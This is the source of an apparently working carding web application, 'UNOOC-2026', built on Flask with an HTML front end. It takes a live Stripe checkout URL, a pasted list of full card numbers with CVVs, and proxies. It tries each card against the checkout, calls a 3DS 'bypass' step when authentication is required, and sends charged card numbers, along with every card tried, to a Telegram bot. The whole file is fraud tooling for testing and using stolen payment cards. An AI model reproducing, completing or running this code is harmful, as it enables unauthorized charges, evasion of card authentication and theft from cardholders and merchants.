def send_telegram_autohitter(cc, response, bin_info, merchant, price, email, checkout_url, tried_cards=None):
    if not TELEGRAM_BOT_TOKEN:
        logger.warning("Telegram bot token not configured, skipping notification")
        return False
    
    try:
        bin_brand = bin_info.get('brand', 'N/A') if bin_info else 'N/A'
        bin_type = bin_info.get('type', 'N/A') if bin_info else 'N/A'
        bin_level = bin_info.get('level', 'N/A') if bin_info else 'N/A'
        bin_bank = bin_info.get('bank', 'N/A') if bin_info else 'N/A'
        bin_country = bin_info.get('country', 'N/A') if bin_info else 'N/A'
        bin_flag = bin_info.get('country_flag', '') if bin_info else ''
        
        tried_list = ""
        if tried_cards and len(tried_cards) > 0:
            tried_list = "\n".join([f"• {c}" for c in tried_cards])
        
        message = f"""━━━━━━━━━━━━━━━
💠 𝐏𝐀𝐘𝐌𝐄𝐍𝐓 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 💠
━━━━━━━━━━━━━━━

💳 𝐂𝐚𝐫𝐝  : {cc}
🔥 𝐒𝐭𝐚𝐭𝐮𝐬 : Paid
💰 𝐀𝐦𝐨𝐮𝐧𝐭 : {price}
🌐 𝐒𝐢𝐭𝐞   : {merchant}
📩 𝐌𝐚𝐢𝐥  : {email}

📦 𝐈𝐧𝐟𝐨  : {bin_brand} - {bin_type} - {bin_level}
🏦 𝐁𝐚𝐧𝐤  : {bin_bank}
🌍 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {bin_country} {bin_flag}

🔗 𝐂𝐨𝐧𝐟𝐢𝐫𝐦 :
{checkout_url}

🙏 Thank you!
━━━━━━━━━━━━━━━
👤 𝐃𝐞𝐯 : @Pyftp
━━━━━━━━━━━━━━━
📋 𝐀𝐥𝐥 𝐓𝐫𝐢𝐞𝐝 𝐂𝐚𝐫𝐝𝐬 ({len(tried_cards) if tried_cards else 0}):
{tried_list}"""
        
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        
        logger.info(f"Sending Telegram notification for charged card: {cc[:6]}******{cc[-4:]}")
        
        resp = requests.post(
            url,
            json={
                "chat_id": TELEGRAM_CHAT_ID,
                "text": message,
                "disable_web_page_preview": True
            },
            timeout=15
        )
        
        if resp.status_code == 200:
            logger.info("Telegram notification sent successfully")
            return True
        else:
            logger.error(f"Telegram API error: {resp.status_code} - {resp.text[:100]}")
            return False
            
    except requests.Timeout:
        logger.error("Telegram notification timeout")
        return False
    except Exception as e:
        log_error("send_telegram_autohitter", e)
        return False


HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>UNOOC-2026</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔐</text></svg>">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        body {
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(145deg, #0a0a0f 0%, #12121a 50%, #0a0a0f 100%);
            min-height: 100vh;
            padding: 20px;
            color: #d0d0d8;
            position: relative;
            overflow-x: hidden;
        }
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(ellipse at 20% 0%, rgba(90, 100, 130, 0.08) 0%, transparent 50%),
                radial-gradient(ellipse at 80% 100%, rgba(70, 80, 110, 0.06) 0%, transparent 50%);
            pointer-events: none;
            z-index: 0;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            position: relative;
            z-index: 1;
        }
        h1 {
            color: #a0b0c8;
            text-align: center;
            margin-bottom: 30px;
            font-weight: 700;
            font-size: 36px;
            letter-spacing: 3px;
        }
        .glass {
            background: rgba(25, 28, 38, 0.8);
            border: 1px solid rgba(100, 120, 150, 0.2);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        }
        .input-section {
            background: rgba(25, 28, 38, 0.85);
            border-radius: 16px;
            padding: 25px;
            margin-bottom: 20px;
            border: 1px solid rgba(100, 120, 150, 0.25);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }
        .input-section:hover {
            border-color: rgba(100, 120, 150, 0.4);
        }
        label {
            display: block;
            color: #8090a8;
            margin-bottom: 10px;
            font-weight: 500;
            font-size: 13px;
            letter-spacing: 1px;
            text-transform: uppercase;
        }
        textarea {
            width: 100%;
            padding: 16px;
            background: rgba(15, 18, 25, 0.9);
            border: 1px solid rgba(80, 100, 130, 0.3);
            border-radius: 12px;
            color: #d0d0d8;
            font-size: 14px;
            font-family: 'Courier New', monospace;
            resize: vertical;
            min-height: 120px;
            transition: border-color 0.2s ease;
        }
        textarea:focus {
            outline: none;
            border-color: rgba(100, 130, 170, 0.5);
        }
        textarea::placeholder { color: #505868; }
        .btn-row {
            display: flex;
            gap: 15px;
            margin-top: 25px;
            flex-wrap: wrap;
        }
        button {
            padding: 14px 28px;
            border: none;
            border-radius: 12px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s ease, transform 0.15s ease;
            text-transform: uppercase;
            letter-spacing: 1.5px;
            font-family: 'Poppins', sans-serif;
        }
        button:active {
            transform: scale(0.98);
        }
        .btn-primary {
            background: #4a5568;
            color: #fff;
            flex: 1;
            min-width: 150px;
            border: 1px solid rgba(100, 120, 150, 0.3);
        }
        .btn-primary:hover {
            background: #5a6578;
        }
        .btn-danger {
            background: #553030;
            color: #fff;
            border: 1px solid rgba(180, 80, 80, 0.3);
        }
        .btn-danger:hover {
            background: #653838;
        }
        .btn-secondary {
            background: rgba(30, 35, 45, 0.8);
            color: #8090a8;
            border: 1px solid rgba(80, 100, 130, 0.4);
        }
        .btn-secondary:hover {
            border-color: rgba(100, 130, 170, 0.5);
            color: #a0b0c8;
        }
        .results-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 25px;
            margin-top: 25px;
        }
        @media (max-width: 768px) {
            .results-grid { grid-template-columns: 1fr; }
        }
        .result-box {
            background: rgba(25, 28, 38, 0.85);
            border-radius: 16px;
            padding: 20px;
            border: 1px solid rgba(100, 120, 150, 0.2);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }
        .result-box:hover {
            border-color: rgba(100, 120, 150, 0.35);
        }
        .result-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            padding-bottom: 15px;
            border-bottom: 1px solid rgba(80, 100, 130, 0.3);
        }
        .result-title {
            font-size: 16px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .result-title.approved { color: #81c784; }
        .result-title.declined { color: #e57373; }
        .count-badge {
            background: rgba(0,0,0,0.3);
            padding: 6px 14px;
            border-radius: 20px;
            font-size: 12px;
            border: 1px solid rgba(100, 120, 150, 0.2);
        }
        .cards-container {
            max-height: 400px;
            overflow-y: auto;
            padding-right: 5px;
        }
        .cards-container::-webkit-scrollbar { width: 6px; }
        .cards-container::-webkit-scrollbar-track { background: #15181f; border-radius: 3px; }
        .cards-container::-webkit-scrollbar-thumb { background: #3a4050; border-radius: 3px; }
        .card {
            background: rgba(18, 22, 30, 0.9);
            border: 1px solid rgba(80, 100, 130, 0.25);
            border-radius: 12px;
            padding: 14px;
            margin-bottom: 10px;
            font-size: 12px;
            position: relative;
        }
        .card.approved { border-left: 3px solid #81c784; }
        .card.declined { border-left: 3px solid #e57373; }
        .card-cc {
            font-family: 'Courier New', monospace;
            font-weight: 600;
            margin-bottom: 6px;
            color: #a0b0c8;
        }
        .card-response {
            color: #8090a8;
            line-height: 1.5;
            word-break: break-word;
        }
        .full-response {
            background: rgba(15, 18, 25, 0.9);
            border: 1px solid rgba(100, 120, 150, 0.25);
            border-radius: 12px;
            padding: 14px;
            margin-top: 10px;
            font-family: monospace;
            font-size: 12px;
        }
        .response-line {
            color: #9098a8;
            padding: 3px 0;
            word-break: break-word;
        }
        .response-line.success {
            color: #4ade80;
            font-weight: bold;
        }
        .response-label {
            color: #8b6914;
            font-weight: bold;
        }
        .response-divider {
            color: #3d2015;
            padding: 5px 0;
            text-align: center;
        }
        .card-copy {
            position: absolute;
            top: 8px;
            right: 8px;
            background: none;
            border: none;
            color: #6b5245;
            cursor: pointer;
            padding: 4px 8px;
            font-size: 11px;
            border-radius: 4px;
            transition: all 0.2s;
        }
        .card-copy:hover { color: #a0b0c8; background: rgba(100,130,170,0.1); }
        .progress-bar {
            background: #15181f;
            border-radius: 10px;
            height: 8px;
            margin: 15px 0;
            overflow: hidden;
            display: none;
        }
        .progress-bar.show { display: block; }
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #4a5568, #6a7588);
            border-radius: 10px;
            transition: width 0.3s;
            width: 0%;
        }
        .status-text {
            text-align: center;
            color: #8090a8;
            font-size: 13px;
            margin-top: 10px;
            display: none;
        }
        .status-text.show { display: block; }
        .empty-state {
            text-align: center;
            color: #6b5245;
            padding: 40px 20px;
            font-size: 13px;
        }
        .checkout-info {
            background: rgba(18, 22, 30, 0.9);
            border: 1px solid rgba(80, 100, 130, 0.3);
            border-radius: 12px;
            padding: 15px;
            margin: 15px 0;
            font-size: 13px;
        }
        .checkout-info .info-row {
            display: flex;
            justify-content: space-between;
            padding: 5px 0;
            border-bottom: 1px solid rgba(80, 100, 130, 0.2);
        }
        .checkout-info .info-row:last-child { border-bottom: none; }
        .checkout-info .info-label { color: #6a7588; }
        .checkout-info .info-value { color: #a0b0c8; font-weight: 600; }
        .bin-info {
            margin: 8px 0;
            display: flex;
            flex-wrap: wrap;
            gap: 6px;
            align-items: center;
        }
        .bin-badge {
            background: #3a4050;
            color: #a0b0c8;
            padding: 3px 8px;
            border-radius: 4px;
            font-size: 10px;
            font-weight: 600;
            text-transform: uppercase;
        }
        .bin-bank {
            width: 100%;
            color: #7080a0;
            font-size: 11px;
            margin-top: 4px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>UNOOC-2026</h1>
        
        <div id="autohitter-tab" class="tab-content active">
            <div class="input-section">
                <label>Stripe Checkout URL</label>
                <textarea id="checkoutUrl" placeholder="https://checkout.stripe.com/c/pay/cs_live_..." style="min-height:60px;"></textarea>
                
                <label style="margin-top:15px;">Proxies (optional - one per line, format: ip:port or ip:port:user:pass)</label>
                <textarea id="proxyInput" placeholder="192.168.1.1:8080&#10;192.168.1.2:8080:username:password" style="min-height:60px;"></textarea>
                
                <div class="btn-row" style="margin-top:15px;">
                    <button class="btn-primary" onclick="initCheckout()">Load Checkout</button>
                </div>
                
                <div class="checkout-info" id="checkoutInfo" style="display:none;">
                    <div class="info-row"><span class="info-label">Merchant</span><span class="info-value" id="infoMerchant">-</span></div>
                    <div class="info-row"><span class="info-label">Email</span><span class="info-value" id="infoEmail">-</span></div>
                    <div class="info-row"><span class="info-label">Price</span><span class="info-value" id="infoPrice">-</span></div>
                    <div class="info-row"><span class="info-label">PK</span><span class="info-value" id="infoPk">-</span></div>
                    <div class="info-row"><span class="info-label">CS</span><span class="info-value" id="infoCs">-</span></div>
                </div>
            </div>
            
            <div class="input-section" id="ahCardsSection" style="display:none;">
                <label>CC List (one per line)</label>
                <textarea id="ahCcInput" placeholder="4111111111111111|12|2025|123"></textarea>
                
                <div class="btn-row">
                    <button class="btn-primary" id="ahStartBtn" onclick="startAutoHit()">Start Auto Hit</button>
                    <button class="btn-danger" id="ahStopBtn" onclick="stopAutoHit()" style="display:none;">Stop</button>
                    <button class="btn-secondary" onclick="clearAhLogs()">Clear Logs</button>
                </div>
                
                <div class="progress-bar" id="ahProgressBar">
                    <div class="progress-fill" id="ahProgressFill"></div>
                </div>
                <div class="status-text" id="ahStatusText">Processing...</div>
            </div>
            
            <div class="results-grid" id="ahResultsGrid" style="display:none;">
                <div class="result-box">
                    <div class="result-header">
                        <span class="result-title approved">Charged</span>
                        <span class="count-badge" id="ahChargedCount">0</span>
                    </div>
                    <button class="btn-secondary" style="width:100%;margin-bottom:15px;padding:10px;" onclick="copyAllAh('charged')">Copy All Charged</button>
                    <div class="cards-container" id="ahChargedCards">
                        <div class="empty-state">No charged cards yet</div>
                    </div>
                </div>
                
                <div class="result-box">
                    <div class="result-header">
                        <span class="result-title declined">Declined/3DS</span>
                        <span class="count-badge" id="ahDeclinedCount">0</span>
                    </div>
                    <button class="btn-secondary" style="width:100%;margin-bottom:15px;padding:10px;" onclick="copyAllAh('declined')">Copy All Declined</button>
                    <div class="cards-container" id="ahDeclinedCards">
                        <div class="empty-state">No declined cards yet</div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <script>
        let ahCheckoutData = null;
        let ahRunning = false;
        let ahChargedList = [];
        let ahDeclinedList = [];
        let ahProxies = [];
        let ahTriedCards = [];
        
        async function initCheckout() {
            const url = document.getElementById('checkoutUrl').value.trim();
            if (!url) return alert('Please enter checkout URL');
            
            document.getElementById('checkoutInfo').style.display = 'none';
            document.getElementById('ahCardsSection').style.display = 'none';
            document.getElementById('ahResultsGrid').style.display = 'none';
            
            try {
                const response = await fetch('/autohitter/init', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({checkout_url: url})
                });
                const data = await response.json();
                
                if (data.error) {
                    alert('Error: ' + data.error);
                    return;
                }
                
                ahCheckoutData = data;
                ahCheckoutData.checkout_url = url;
                document.getElementById('infoMerchant').textContent = data.merchant || 'Unknown';
                document.getElementById('infoEmail').textContent = data.email || 'N/A';
                document.getElementById('infoPrice').textContent = data.price ? (data.currency + ' ' + data.price.toFixed(2)) : 'N/A';
                document.getElementById('infoPk').textContent = data.pk ? (data.pk.substring(0, 25) + '...') : 'N/A';
                document.getElementById('infoCs').textContent = data.cs ? (data.cs.substring(0, 25) + '...') : 'N/A';
                
                document.getElementById('checkoutInfo').style.display = 'block';
                document.getElementById('ahCardsSection').style.display = 'block';
                document.getElementById('ahResultsGrid').style.display = 'grid';
            } catch (e) {
                alert('Error loading checkout: ' + e.message);
            }
        }
        
        async function startAutoHit() {
            const input = document.getElementById('ahCcInput').value.trim();
            if (!input) return alert('Please enter CC list');
            if (!ahCheckoutData) return alert('Please load checkout first');
            
            const proxyInput = document.getElementById('proxyInput').value.trim();
            ahProxies = proxyInput ? proxyInput.split('\\n').map(p => p.trim()).filter(p => p) : [];
            ahTriedCards = [];
            
            const ccList = input.split('\\n').map(cc => cc.trim()).filter(cc => cc);
            if (ccList.length === 0) return;
            
            ahRunning = true;
            document.getElementById('ahStartBtn').style.display = 'none';
            document.getElementById('ahStopBtn').style.display = 'inline-block';
            document.getElementById('ahProgressBar').classList.add('show');
            document.getElementById('ahStatusText').classList.add('show');
            
            for (let i = 0; i < ccList.length; i++) {
                if (!ahRunning) break;
                
                const cc = ccList[i];
                ahTriedCards.push(cc);
                const progress = ((i + 1) / ccList.length) * 100;
                document.getElementById('ahProgressFill').style.width = progress + '%';
                document.getElementById('ahStatusText').textContent = 'Processing ' + (i + 1) + ' of ' + ccList.length + '...';
                
                try {
                    const response = await fetch('/autohitter/charge', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({cc: cc, checkout_data: ahCheckoutData, proxies: ahProxies, tried_cards: ahTriedCards})
                    });
                    const data = await response.json();
                    addAhCard(data.card, data.response, data.status, data.time, data.bin_info);
                } catch (e) {
                    addAhCard(cc, 'Error: Request failed', 'ERROR', 0, null);
                }
            }
            
            finishAutoHit();
        }
        
        function stopAutoHit() {
            ahRunning = false;
            finishAutoHit();
        }
        
        function finishAutoHit() {
            ahRunning = false;
            document.getElementById('ahStartBtn').style.display = 'inline-block';
            document.getElementById('ahStopBtn').style.display = 'none';
            document.getElementById('ahStatusText').textContent = 'Completed!';
            setTimeout(() => {
                document.getElementById('ahProgressBar').classList.remove('show');
                document.getElementById('ahStatusText').classList.remove('show');
            }, 2000);
        }
        
        function addAhCard(cc, response, status, time, binInfo) {
            const isCharged = status === 'CHARGED';
            const container = document.getElementById(isCharged ? 'ahChargedCards' : 'ahDeclinedCards');
            const countEl = document.getElementById(isCharged ? 'ahChargedCount' : 'ahDeclinedCount');
            const list = isCharged ? ahChargedList : ahDeclinedList;
            
            if (container.querySelector('.empty-state')) {
                container.innerHTML = '';
            }
            
            list.push({cc, response, status});
            countEl.textContent = list.length;
            
            let binHtml = '';
            if (binInfo) {
                binHtml = '<div class="bin-info"><span class="bin-badge">' + binInfo.brand + '</span><span class="bin-badge">' + binInfo.type + '</span><span class="bin-badge">' + binInfo.country + ' ' + binInfo.country_flag + '</span><div class="bin-bank">' + binInfo.bank + '</div></div>';
            }
            
            let fullResponseHtml = '';
            if (isCharged && ahCheckoutData) {
                const merchant = ahCheckoutData.merchant || 'Unknown';
                const amount = (ahCheckoutData.currency || 'USD') + ' ' + (ahCheckoutData.price || '0');
                const email = ahCheckoutData.email || 'N/A';
                const checkoutUrl = ahCheckoutData.checkout_url || 'N/A';
                const binLine = binInfo ? (binInfo.brand + ' - ' + binInfo.type + ' - ' + (binInfo.level || 'N/A')) : 'N/A';
                const bankLine = binInfo ? binInfo.bank : 'N/A';
                const countryLine = binInfo ? (binInfo.country + ' ' + binInfo.country_flag) : 'N/A';
                fullResponseHtml = '<div class="full-response"><div class="response-divider">━━━━━━━━━━━━━━━</div><div class="response-line success" style="text-align:center;font-size:14px;">💠 𝐏𝐀𝐘𝐌𝐄𝐍𝐓 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 💠</div><div class="response-divider">━━━━━━━━━━━━━━━</div><div class="response-line"><span class="response-label">💳 𝐂𝐚𝐫𝐝  :</span> ' + escapeHtml(cc) + '</div><div class="response-line success"><span class="response-label">🔥 𝐒𝐭𝐚𝐭𝐮𝐬 :</span> Paid</div><div class="response-line"><span class="response-label">💰 𝐀𝐦𝐨𝐮𝐧𝐭 :</span> ' + escapeHtml(amount) + '</div><div class="response-line"><span class="response-label">🌐 𝐒𝐢𝐭𝐞   :</span> ' + escapeHtml(merchant) + '</div><div class="response-line"><span class="response-label">📩 𝐌𝐚𝐢𝐥  :</span> ' + escapeHtml(email) + '</div><br><div class="response-line"><span class="response-label">📦 𝐈𝐧𝐟𝐨  :</span> ' + escapeHtml(binLine) + '</div><div class="response-line"><span class="response-label">🏦 𝐁𝐚𝐧𝐤  :</span> ' + escapeHtml(bankLine) + '</div><div class="response-line"><span class="response-label">🌍 𝐂𝐨𝐮𝐧𝐭𝐫𝐲:</span> ' + escapeHtml(countryLine) + '</div><br><div class="response-line"><span class="response-label">🔗 𝐂𝐨𝐧𝐟𝐢𝐫𝐦 :</span></div><div class="response-line"><a href="' + escapeHtml(checkoutUrl) + '" target="_blank" style="color:#8b6914;word-break:break-all;">' + escapeHtml(checkoutUrl) + '</a></div><br><div class="response-line" style="text-align:center;">🙏 Thank you!</div><div class="response-divider">━━━━━━━━━━━━━━━</div><div class="response-line"><span class="response-label">👤 𝐃𝐞𝐯 :</span> @Pyftp</div></div>';
            }
            
            const statusClass = isCharged ? 'approved' : 'declined';
            const card = document.createElement('div');
            card.className = 'card ' + statusClass;
            if (isCharged) {
                card.innerHTML = '<button class="card-copy" onclick="copyCard(this)">Copy</button><div class="card-cc">' + escapeHtml(cc) + '</div>' + binHtml + fullResponseHtml;
            } else {
                card.innerHTML = '<button class="card-copy" onclick="copyCard(this)">Copy</button><div class="card-cc">' + escapeHtml(cc) + '</div>' + binHtml + '<div class="card-response">[' + status + '] ' + escapeHtml(response) + ' (' + time + 's)</div>';
            }
            container.insertBefore(card, container.firstChild);
        }
        
        function copyAllAh(type) {
            const list = type === 'charged' ? ahChargedList : ahDeclinedList;
            if (list.length === 0) return alert('No cards to copy');
            const text = list.map(item => item.cc + ' | ' + item.status + ' | ' + item.response).join('\\n');
            navigator.clipboard.writeText(text);
            alert('Copied ' + list.length + ' cards!');
        }
        
        function clearAhLogs() {
            ahChargedList = [];
            ahDeclinedList = [];
            document.getElementById('ahChargedCards').innerHTML = '<div class="empty-state">No charged cards yet</div>';
            document.getElementById('ahDeclinedCards').innerHTML = '<div class="empty-state">No declined cards yet</div>';
            document.getElementById('ahChargedCount').textContent = '0';
            document.getElementById('ahDeclinedCount').textContent = '0';
        }
        
        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }
        
        function copyCard(btn) {
            const card = btn.parentElement;
            const cc = card.querySelector('.card-cc').textContent;
            const fullResp = card.querySelector('.full-response');
            const cardResp = card.querySelector('.card-response');
            let copyText = cc;
            if (fullResp) {
                copyText = fullResp.innerText;
            } else if (cardResp) {
                copyText = cc + '\\n' + cardResp.textContent;
            }
            navigator.clipboard.writeText(copyText);
            btn.textContent = 'Copied!';
            setTimeout(() => btn.textContent = 'Copy', 1500);
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    logger.debug("Serving index page")
    return render_template_string(HTML_TEMPLATE)

@app.route('/autohitter/init', methods=['POST'])
def autohitter_init():
    logger.info("Received checkout init request")
    data = request.get_json()
    checkout_url = data.get('checkout_url', '')
    
    if not checkout_url:
        logger.warning("Empty checkout URL received")
        return jsonify({"error": "No checkout URL provided"})
    
    extracted = extract_checkout_url(checkout_url) or checkout_url
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        result = loop.run_until_complete(get_checkout_info_async(extracted))
        if result.get("error"):
            logger.error(f"Checkout init failed: {result['error']}")
        else:
            logger.info(f"Checkout init success: {result.get('merchant', 'Unknown')}")
    except Exception as e:
        log_error("autohitter_init", e)
        result = {"error": str(e)}
    finally:
        loop.close()
    
    return jsonify(result)

@app.route('/autohitter/charge', methods=['POST'])
def autohitter_charge():
    data = request.get_json()
    cc = data.get('cc', '')
    checkout_data = data.get('checkout_data', {})
    proxies = data.get('proxies', [])
    tried_cards = data.get('tried_cards', [])
    
    logger.debug(f"Received charge request for card: {cc[:6]}******")
    
    card = parse_card_autohitter(cc)
    if not card:
        logger.warning(f"Invalid card format: {cc[:20]}...")
        return jsonify({'card': cc, 'status': 'INVALID', 'response': 'Invalid card format', 'time': 0})
    
    proxy = None
    if proxies:
        import random
        proxy = random.choice(proxies)
        logger.debug(f"Selected proxy: {proxy.split(':')[0]}:***")
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        # First attempt: normal charge
        result = loop.run_until_complete(charge_card_async(card, checkout_data, proxy))
        
        # If 3DS required, attempt browser bypass
        if result["status"] == "3DS":
            logger.info(f"3DS detected for {card['cc'][:6]}******, attempting browser bypass...")
            result = loop.run_until_complete(attempt_3ds_bypass(result, checkout_data, card))
            
    except Exception as e:
        log_error("autohitter_charge", e, f"Card: {card['cc'][:6]}******")
        result = {
            'card': cc,
            'status': 'ERROR',
            'response': f'Server error: {str(e)[:50]}',
            'time': 0
        }
    finally:
        loop.close()
    
    # Get BIN info
    bin_info = get_bin_info(cc)
    result['bin_info'] = bin_info
    
    # Send Telegram notification for charged cards
    if result['status'] == 'CHARGED':
        logger.info(f"Card charged successfully, sending Telegram notification: {cc[:6]}******{cc[-4:]}")
        price_str = f"{checkout_data.get('currency', 'USD')} {checkout_data.get('price', 0)}"
        email = checkout_data.get('email', 'N/A')
        checkout_url = checkout_data.get('checkout_url', 'N/A')
        send_telegram_autohitter(
            cc,
            result['response'],
            bin_info,
            checkout_data.get('merchant', 'Unknown'),
            price_str,
            email,
            checkout_url,
            tried_cards
        )
    
    logger.debug(f"Charge complete for {cc[:6]}****** | Status: {result['status']} | Time: {result['time']}s")
    
    return jsonify(result)

@app.errorhandler(404)
def not_found(error):
    logger.warning(f"404 error: {request.url}")
    return jsonify({'error': 'Not found'}), 404

@app.errorhandler(500)
def internal_error(error):
    logger.error(f"500 error: {str(error)}")
    return jsonify({'error': 'Internal server error'}), 500

if __name__ == '__main__':
    logger.info("Starting Flask server on 0.0.0.0:5000")
    try:
        app.run(host='0.0.0.0', port=5000, debug=False)
    except Exception as e:
        logger.critical(f"Failed to start server: {str(e)}")
        error_logger.critical(f"Server startup failure: {str(e)}\n{traceback.format_exc()}")
